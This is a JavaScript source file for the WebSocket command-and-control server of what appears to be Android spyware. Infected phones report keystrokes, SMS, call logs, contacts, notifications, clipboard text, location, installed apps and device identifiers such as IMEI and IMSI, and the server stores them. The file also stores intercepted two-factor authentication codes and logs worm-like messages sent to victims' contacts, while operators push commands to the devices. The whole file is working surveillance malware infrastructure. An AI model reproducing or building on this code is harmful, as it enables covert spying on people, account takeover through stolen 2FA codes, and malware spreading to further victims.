const db = require('./utils/db');
const redis = require('./utils/redis');

module.exports = function(wss, logger) {
  const clients = new Map(); // deviceId -> ws
  const operators = new Set(); // admin ws connections

  wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const deviceId = url.searchParams.get('device');
    const token = url.searchParams.get('token');
    const isOperator = url.searchParams.get('operator') === 'true';

    ws.isAlive = true;

    ws.on('pong', () => { ws.isAlive = true; });

    if (isOperator && token) {
      operators.add(ws);
      ws.type = 'operator';
      logger.info(`Operator connected: ${req.socket.remoteAddress}`);
      ws.send(JSON.stringify({ type: 'connected', role: 'operator' }));
    } else if (deviceId) {
      clients.set(deviceId, ws);
      ws.deviceId = deviceId;
      ws.type = 'device';
      logger.info(`Device connected: ${deviceId}`);
      db.query(
        `UPDATE devices SET status = 'online', last_seen = NOW() WHERE device_id = $1`,
        [deviceId]
      ).catch(() => {});
      ws.send(JSON.stringify({ type: 'connected', deviceId }));
    } else {
      ws.close();
      return;
    }

    ws.on('message', async (data) => {
      try {
        const msg = JSON.parse(data);

        if (ws.type === 'device') {
          // Device sending data
          await handleDeviceMessage(msg, ws.deviceId, logger);
          // Broadcast to operators
          operators.forEach(op => {
            if (op.readyState === 1) {
              op.send(JSON.stringify({ ...msg, sourceDevice: ws.deviceId }));
            }
          });
        } else if (ws.type === 'operator') {
          // Operator sending command
          if (msg.targetDevice && clients.has(msg.targetDevice)) {
            const target = clients.get(msg.targetDevice);
            if (target.readyState === 1) {
              target.send(JSON.stringify(msg));
            }
          }
        }
      } catch (err) {
        logger.error('WS message error:', err);
      }
    });

    ws.on('close', () => {
      if (ws.type === 'device' && ws.deviceId) {
        clients.delete(ws.deviceId);
        db.query(
          `UPDATE devices SET status = 'offline' WHERE device_id = $1`,
          [ws.deviceId]
        ).catch(() => {});
      } else if (ws.type === 'operator') {
        operators.delete(ws);
      }
    });
  });

  // Heartbeat
  const interval = setInterval(() => {
    wss.clients.forEach(ws => {
      if (!ws.isAlive) return ws.terminate();
      ws.isAlive = false;
      ws.ping();
    });
  }, 30000);

  wss.on('close', () => clearInterval(interval));
};

async function handleDeviceMessage(msg, deviceId, logger) {
  const { type, payload } = msg;

  switch (type) {
    case 'heartbeat':
      await db.query(
        `UPDATE devices SET last_seen = NOW(), battery_level = $1, ip_address = $2::inet WHERE device_id = $3`,
        [payload.battery, payload.ip, deviceId]
      );
      break;

    case 'keylog':
      await db.query(
        `INSERT INTO keylogs (device_id, app_package, app_name, keystrokes, session_id)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5)`,
        [deviceId, payload.appPackage, payload.appName, payload.keystrokes, payload.sessionId]
      );
      break;

    case 'sms':
      await db.query(
        `INSERT INTO sms_logs (device_id, message_id, address, body, type, read, date, thread_id, contact_name)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8, $9)`,
        [deviceId, payload.id, payload.address, payload.body, payload.type,
         payload.read, payload.date, payload.threadId, payload.contactName]
      );
      break;

    case 'call':
      await db.query(
        `INSERT INTO call_logs (device_id, number, name, type, duration, date, location)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7)`,
        [deviceId, payload.number, payload.name, payload.type, payload.duration, payload.date, payload.location]
      );
      break;

    case 'contact':
      await db.query(
        `INSERT INTO contacts (device_id, contact_id, display_name, phone_numbers, emails, photo_uri, last_updated)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7)
         ON CONFLICT DO NOTHING`,
        [deviceId, payload.id, payload.name, JSON.stringify(payload.phones),
         JSON.stringify(payload.emails), payload.photo, payload.updated]
      );
      break;

    case 'notification':
      await db.query(
        `INSERT INTO notifications (device_id, package_name, app_name, title, text, ticker, post_time, actions, category, priority)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8, $9, $10)`,
        [deviceId, payload.package, payload.appName, payload.title, payload.text,
         payload.ticker, payload.postTime, JSON.stringify(payload.actions), payload.category, payload.priority]
      );
      break;

    case 'clipboard':
      await db.query(
        `INSERT INTO clipboard_logs (device_id, text, app_source)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3)`,
        [deviceId, payload.text, payload.source]
      );
      break;

    case 'location':
      await db.query(
        `INSERT INTO location_history (device_id, latitude, longitude, altitude, accuracy, speed, bearing, provider)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8)`,
        [deviceId, payload.lat, payload.lng, payload.alt, payload.accuracy,
         payload.speed, payload.bearing, payload.provider]
      );
      await db.query(
        `UPDATE devices SET latitude = $1, longitude = $2, accuracy = $3, location_updated = NOW()
         WHERE device_id = $4`,
        [payload.lat, payload.lng, payload.accuracy, deviceId]
      );
      break;

    case 'installed_apps':
      for (const app of payload.apps) {
        await db.query(
          `INSERT INTO installed_apps (device_id, package_name, app_name, version, is_system_app, is_enabled, first_install, last_update, permissions)
           VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6, $7, $8, $9)
           ON CONFLICT DO NOTHING`,
          [deviceId, app.package, app.name, app.version, app.isSystem, app.isEnabled,
           app.firstInstall, app.lastUpdate, JSON.stringify(app.permissions)]
        );
      }
      break;

    case 'processes':
      for (const proc of payload.processes) {
        await db.query(
          `INSERT INTO running_processes (device_id, pid, process_name, package_name, cpu_usage, memory_usage)
           VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5, $6)`,
          [deviceId, proc.pid, proc.name, proc.package, proc.cpu, proc.memory]
        );
      }
      break;

    case 'network_event':
      await db.query(
        `INSERT INTO network_events (device_id, event_type, ssid, bssid, ip_address, gateway, dns_servers, is_vpn, is_proxy)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5::inet, $6::inet, $7, $8, $9)`,
        [deviceId, payload.type, payload.ssid, payload.bssid, payload.ip,
         payload.gateway, payload.dns, payload.isVpn, payload.isProxy]
      );
      break;

    case 'tfa_intercept':
      await db.query(
        `INSERT INTO tfa_intercepts (device_id, code, source_app, source_number, message)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5)`,
        [deviceId, payload.code, payload.sourceApp, payload.sourceNumber, payload.message]
      );
      break;

    case 'worm_log':
      await db.query(
        `INSERT INTO worm_logs (device_id, target_contact, message_body, sent_via, status)
         VALUES ((SELECT id FROM devices WHERE device_id = $1), $2, $3, $4, $5)`,
        [deviceId, payload.contact, payload.message, payload.via, payload.status]
      );
      break;

    case 'command_result':
      await db.query(
        `UPDATE commands SET status = $1, result = $2, executed_at = NOW()
         WHERE id = $3`,
        [payload.status, JSON.stringify(payload.result), payload.commandId]
      );
      break;

    case 'device_info':
      await db.query(
        `UPDATE devices SET
          device_name = $1, model = $2, manufacturer = $3, android_version = $4,
          sdk_level = $5, imei = $6, imsi = $7, phone_number = $8, carrier = $9,
          mcc_mnc = $10, country = $11, mac_address = $12, is_rooted = $13,
          is_emulator = $14, screen_resolution = $15, total_ram = $16, total_storage = $17
         WHERE device_id = $18`,
        [payload.name, payload.model, payload.manufacturer, payload.androidVersion,
         payload.sdk, payload.imei, payload.imsi, payload.phone, payload.carrier,
         payload.mccMnc, payload.country, payload.mac, payload.rooted,
         payload.emulator, payload.resolution, payload.ram, payload.storage, deviceId]
      );
      break;

    default:
      logger.info(`Unhandled device message type: ${type}`);
  }
}
